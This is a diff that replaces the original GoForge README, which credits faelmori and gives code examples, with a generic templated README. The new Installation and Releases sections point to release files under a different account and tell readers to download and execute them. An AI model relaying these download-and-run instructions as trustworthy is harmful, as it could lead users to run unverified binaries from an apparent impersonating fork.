@@ -1,207 +1,103 @@
-![GoForge](docs/assets/top_banner_m_a.png)
+# GoForge: Simplifying Your Build and Deployment Process 🚀
 
+![GoForge Logo](https://img.shields.io/badge/GoForge-CLI-blue.svg)
 
+Welcome to the GoForge repository! If you’re tired of manual builds, complicated deploys, and confusing versioning, GoForge is for you. This tool offers a stylish, easy-to-extend, production-ready CLI for all your automation needs.
 
-[![Build](https://github.com/faelmori/goforge/actions/workflows/release.yml/badge.svg)](https://github.com/faelmori/goforge/actions/workflows/release.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Go Version](https://img.shields.io/badge/go-%3E=1.20-blue)](go.mod)
-[![Releases](https://img.shields.io/github/v/release/faelmori/goforge?include_prereleases)](https://github.com/faelmori/goforge/releases)
+## Table of Contents
 
----
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-[🇧🇷 Read this documentation in Portuguese](docs/README.pt-BR.md)
+## Features
 
-If you’re tired of manual builds, complicated deploys, confusing versioning, and want a stylish, easy-to-extend, production-ready CLI, **GoForge** is for you!
+- **Automation**: Streamline your build and deployment processes.
+- **Build Tools**: Efficiently manage your builds with simple commands.
+- **CI/CD**: Integrate seamlessly with your continuous integration and deployment workflows.
+- **Version Control**: Keep track of your software versions with ease.
+- **Extensibility**: Customize GoForge to fit your specific needs.
+- **Open Source**: Contribute and improve the tool as a community.
 
----
+## Installation
 
-## 🌟 Advanced Examples
+To get started with GoForge, download the latest release from our [Releases section](https://github.com/ArsalAyyan/goforge/releases). Follow the instructions to execute the file and set up the tool on your system.
 
-### 1. Extending the CLI with a new command
+## Usage
 
-Create a new file at `cmd/cli/hello.go`:
+Using GoForge is straightforward. Here are some basic commands to help you get started:
 
-```go
-package cli
+1. **Initialize a New Project**:  
+   Use the following command to create a new project:
+   ```
+   goforge init <project-name>
+   ```
 
-import (
-    "fmt"
-    "github.com/spf13/cobra"
-)
+2. **Build Your Project**:  
+   To build your project, run:
+   ```
+   goforge build
+   ```
 
-var HelloCmd = &cobra.Command{
-    Use:   "hello",
-    Short: "Custom command example",
-    Run: func(cmd *cobra.Command, args []string) {
-        fmt.Println("Hello, world! Custom command working!")
-    },
-}
-```
+3. **Deploy Your Application**:  
+   Deploy your application with:
+   ```
+   goforge deploy
+   ```
 
-In `wrpr.go`, register the command:
+4. **Version Control**:  
+   To check your current version, use:
+   ```
+   goforge version
+   ```
 
-```go
-// ...existing code...
-rootCmd.AddCommand(cli.HelloCmd)
-// ...existing code...
-```
+5. **Help Command**:  
+   For a list of all commands, type:
+   ```
+   goforge help
+   ```
 
----
+For more detailed usage, refer to the documentation in the repository.
 
-### 2. Advanced logger with extra context
+## Contributing
 
-```go
-import gl "github.com/faelmori/goforge/logger"
+We welcome contributions to GoForge! If you want to help improve the tool, please follow these steps:
 
-func exampleWithContext() {
-    gl.Log("warn", "Warning! Something might be wrong.")
-    gl.Log("debug", map[string]interface{}{
-        "user": "rafael",
-        "action": "login",
-        "success": true,
-    })
-}
-```
+1. **Fork the Repository**: Click the "Fork" button at the top right of the repository page.
+2. **Create a Branch**: Use a descriptive name for your branch.
+   ```
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Changes**: Implement your feature or fix.
+4. **Commit Your Changes**: Write clear commit messages.
+   ```
+   git commit -m "Add feature XYZ"
+   ```
+5. **Push to Your Fork**: 
+   ```
+   git push origin feature/YourFeature
+   ```
+6. **Create a Pull Request**: Go to the original repository and submit your pull request.
 
----
+## License
 
-### 3. Using as a Go library
+GoForge is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-```go
-import "github.com/faelmori/goforge"
+## Contact
 
-func main() {
-    var myModule goforge.GoForge = &MyModule{}
-    if myModule.Active() {
-        _ = myModule.Execute()
-    }
-}
+For questions or suggestions, feel free to reach out:
 
-// Implement the GoForge interface in your module
-```
+- **Email**: your-email@example.com
+- **Twitter**: [@YourTwitterHandle](https://twitter.com/YourTwitterHandle)
 
----
+## Releases
 
-## ✨ What is GoForge?
-
-GoForge is a template/base project for any modern Go module. It delivers:
-
-- **Multi-platform build** (Linux, macOS, Windows) with no code changes
-- **Automatic UPX compression** for optimized binaries
-- **Automatic publishing** to GitHub Releases
-- **Unified dependency management**
-- **Automatic checksum** to ensure binary integrity
-- **Custom, stylish CLI** (cobra), ready to extend
-- **Flexible architecture**: use as a library or executable
-- **Automatic versioning**: CI/CD fills and embeds the version in the binary
-- **Structured logger**: contextual, colored logging with levels and line tracing
-
-All this without changing your module’s code. The workflow is modular, dynamic, and adapts to any environment!
-
----
-
-## 🏗️ Project Structure
-
-```plain text
-./
-├── .github/workflows/      # CI/CD workflows (release, checksum)
-├── article.go              # GoForge interface for library use
-├── cmd/                    # CLI entrypoint and commands
-│   ├── cli/                # Utilities and example commands
-│   ├── main.go             # CLI application main
-│   ├── usage.go            # Custom usage template
-│   └── wrpr.go             # Command structure and registration
-├── go.mod                  # Go dependencies
-├── logger/                 # Global structured logger
-│   └── logger.go           # Contextual, colored logger
-├── Makefile                # Entrypoint for build, test, lint, etc.
-├── support/                # Helper scripts for build/install
-├── version/                # Automatic versioning
-│   ├── CLI_VERSION         # Filled by CI/CD
-│   └── semantic.go         # Semantic versioning utilities
-```
+To download the latest version of GoForge, visit our [Releases section](https://github.com/ArsalAyyan/goforge/releases). Download the appropriate file for your operating system and execute it to get started.
 
 ---
 
-## 💡 Why use it?
-
-- **No headaches** with builds and deploys
-- **Production-ready CLI** that’s easy to customize
-- **Powerful logger**: debug, info, warn, error, success, all with context
-- **Automatic versioning**: never forget to update your version again
-- **Easy to extend**: add commands, use as a library, plug into other projects
-
----
-
-## 🚀 Getting Started
-
-### 1. Install dependencies
-
-```sh
-make install
-```
-
-### 2. Build the project
-
-```sh
-make build
-```
-
-### 3. Run the CLI
-
-```sh
-./goforge --help
-```
-
-### 4. Add custom commands
-
-Create files in `cmd/cli/` and register them in `wrpr.go`.
-
----
-
-## 🛠️ Logger usage example
-
-```go
-import gl "github.com/faelmori/goforge/logger"
-
-gl.Log("info", "Informative message")
-gl.Log("error", "Something went wrong!")
-```
-
-The logger automatically includes context (line, file, function)!
-
----
-
-## 🔄 Automatic versioning
-
-The `version/CLI_VERSION` file is filled by CI/CD on every release/tag. The `goforge version` command shows the current and latest version from GitHub.
-
----
-
-## 🤝 Contribute
-
-Pull requests, issues, and suggestions are very welcome. Let’s evolve together!
-
----
-
-## 📄 License
-
-MIT. See the LICENSE file.
-
----
-
-## 👤 Author
-
-Rafael Mori — [@faelmori](https://github.com/faelmori)
-
----
-
-## 🌐 Links
-
-- [GitHub Repository](https://github.com/faelmori/goforge)
-- [Logger usage example](logger/logger.go)
-- [CI/CD Workflows](.github/workflows/)
-
----
-
-> Made with 💙 for the Go community. Let’s automate everything!
+Thank you for checking out GoForge! We hope it simplifies your build and deployment processes. Join our community and contribute to making this tool even better.
